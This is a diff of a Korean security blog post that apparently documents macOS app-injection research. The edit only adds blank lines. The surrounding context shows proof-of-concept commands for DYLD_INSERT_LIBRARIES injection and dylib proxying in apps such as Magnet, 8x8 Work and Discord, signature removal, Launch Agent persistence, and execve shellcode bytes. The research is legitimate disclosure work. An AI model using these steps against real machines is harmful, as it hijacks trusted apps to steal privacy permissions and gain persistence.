@@ -188,6 +188,7 @@ __attribute__((constructor)) static void pwn() {
 	NSData *data = [bitmap representationUsingType:NSBitmapImageFileTypePNG properties:NULL];
 	[data writeToFile: @"/tmp/screenshot.png" atomically: NO];
 }
+
 ```
 {% endraw %}
 
@@ -198,6 +199,7 @@ __attribute__((constructor)) static void pwn() {
 {% raw %}
 ```bash
 gcc -dynamiclib -framework Foundation -framework AppKit poc.m -o poc
+
 ```
 {% endraw %}
 
@@ -208,6 +210,7 @@ gcc -dynamiclib -framework Foundation -framework AppKit poc.m -o poc
 {% raw %}
 ```bash
 $ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/Magnet.app/Contents/MacOS/Magnet
+
 ```
 {% endraw %}
 
@@ -283,6 +286,7 @@ __attribute__((constructor)) static void pwn() {
    [task launch];
 
 }
+
 ```
 {% endraw %}
 
@@ -293,6 +297,7 @@ __attribute__((constructor)) static void pwn() {
 {% raw %}
 ```bash
 $ gcc -dynamiclib -framework Foundation poc.m -o poc.dylib
+
 ```
 {% endraw %}
 
@@ -303,6 +308,7 @@ $ gcc -dynamiclib -framework Foundation poc.m -o poc.dylib
 {% raw %}
 ```bash
 $ DYLD_INSERT_LIBRARIES=/tmp/poc.dylib /Applications/logioptionsplus.app/Contents/MacOS/logioptionsplus
+
 ```
 {% endraw %}
 
@@ -384,6 +390,7 @@ Launch Agent는 `~/Library/LaunchAgents`에 존재하는 파일들을 통해 관
         </array>
 </dict>
 </plist>
+
 ```
 {% endraw %}
 
@@ -397,6 +404,7 @@ Launch Agent는 `~/Library/LaunchAgents`에 존재하는 파일들을 통해 관
 {% raw %}
 ```bash
 $ launchctl load com.poc.launcher.plist
+
 ```
 {% endraw %}
 
@@ -533,6 +541,7 @@ Load command 14
    time stamp 0 Thu Jan  1 09:00:00 1970
       current version 1319.100.3
 compatibility version 1.0.0
+
 ```
 {% endraw %}
 
@@ -576,6 +585,7 @@ $ tree
 ├── MacOS
 │   └── 8x8 Work
 ...
+
 ```
 {% endraw %}
 
@@ -697,6 +707,7 @@ static void ex(int argc, const char **argv) {
 
     [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
 }
+
 ```
 {% endraw %}
 
@@ -733,6 +744,7 @@ xcode에서 다음과 같은 컴파일 플래그를 추가해준다.
 $ mv /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Electron\ Framework /Applications/8x8 Work.app/Contents/Frameworks/Electron Framework.framework/Versions/A/_Electron\ Framework
 
 $ install_name_tool -change "@rpath/poc.framework/Versions/A/poc" /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/_Electron\ Framework ./poc
+
 ```
 {% endraw %}
 
@@ -751,6 +763,7 @@ $ install_name_tool -change "@rpath/poc.framework/Versions/A/poc" /Applications/
 {% raw %}
 ```markdown
 $ mv /Users/lourcode/Library/Developer/Xcode/DerivedData/poc-eoopekezczbnvlgrpcigqhnhqgkn/Build/Products/Debug/poc.framework/Versions/A/poc /Applications/8x8\ Work.app/Contents/Frameworks/Electron\ Framework.framework/Versions/A/Electron\ Framework
+
 ```
 {% endraw %}
 
@@ -779,6 +792,7 @@ $ tree
     │   ├── _CodeSignature
     │   └── _Electron Framework # 원본 라이브러리
     └── Current -> A
+
 ```
 {% endraw %}
 
@@ -802,6 +816,7 @@ $ tree
 ```bash
 $ codesign --remove-signature ./Electron\ Framework
 $ codesign --remove-signature ./_Electron\ Framework
+
 ```
 {% endraw %}
 
@@ -875,6 +890,7 @@ Gatekeeper란 사용자가 신뢰하는 소프트웨어만이 실행될 수 있�
 	<string>Window Settings</string>
 </dict>
 </plist>
+
 ```
 {% endraw %}
 
@@ -1014,6 +1030,7 @@ bool TwoWayPipe::CreateServer(const ProcessDescriptor& pd)
     m_state = Created;
     return true;
 }
+
 ```
 {% endraw %}
 
@@ -1084,6 +1101,7 @@ $TMPDIR은 환경 변수에서 확인할 수 있다.
 {% raw %}
 ```bash
 export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./memdump $in $out 105553119630272
+
 ```
 {% endraw %}
 
@@ -1134,7 +1152,8 @@ export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export ou
 {% raw %}
 ```c++
 	unsigned char shellcode[] = "\x48\x31\xc0\x99\x50\x48\xbf\x2f\x74\x6d\x70\x2f\x70\x6f\x63\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";
-	```
+	
+```
 {% endraw %}
 
 
@@ -1145,6 +1164,7 @@ export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export ou
 {% raw %}
 ```bash
 export in=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-in); export out=$(ls /var/folders/n1/nc8h8x5n0_3387ttlfk_54j80000gn/T/*-out); ./poc $in $out pwsh
+
 ```
 {% endraw %}
 
@@ -1224,6 +1244,7 @@ For help, see: https://nodejs.org/en/docs/inspector
 Discord 0.0.293
 2024-02-10 16:17:45.729 Discord[59399:936987] WARNING: Secure coding is not enabled for restorable state! Enable secure coding by implementing NSApplicationDelegate.applicationSupportsSecureRestorableState: and returning YES.
 Starting app.
+
 ```
 {% endraw %}
 
@@ -1254,6 +1275,7 @@ void main(int argc, const char **argv) {
 
     [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
 }
+
 ```
 {% endraw %}
 
@@ -1264,6 +1286,7 @@ void main(int argc, const char **argv) {
 {% raw %}
 ```bash
 $ gcc -framework Foundation -framework AVFoundation poc.m -o poc
+
 ```
 {% endraw %}
 
@@ -1316,6 +1339,7 @@ Visual Studio Code 또한 JIT를 제외하면 런타임 내의 프로세스 주�
 $ ELECTRON_RUN_AS_NODE=1 /Applications/Visual\ Studio\ Code.app/Contents/MacOS/Electron
 Welcome to Node.js v18.17.1.
 Type ".help" for more information.
+
 ```
 {% endraw %}
 
@@ -1355,6 +1379,7 @@ Launch Agent는 다음과 같다.
             </array>
       </dict>
 </plist>
+
 ```
 {% endraw %}
 
@@ -1367,6 +1392,7 @@ Launch Agent는 다음과 같다.
 {% raw %}
 ```bash
 launchctl load com.poc.launcher.plist
+
 ```
 {% endraw %}
 
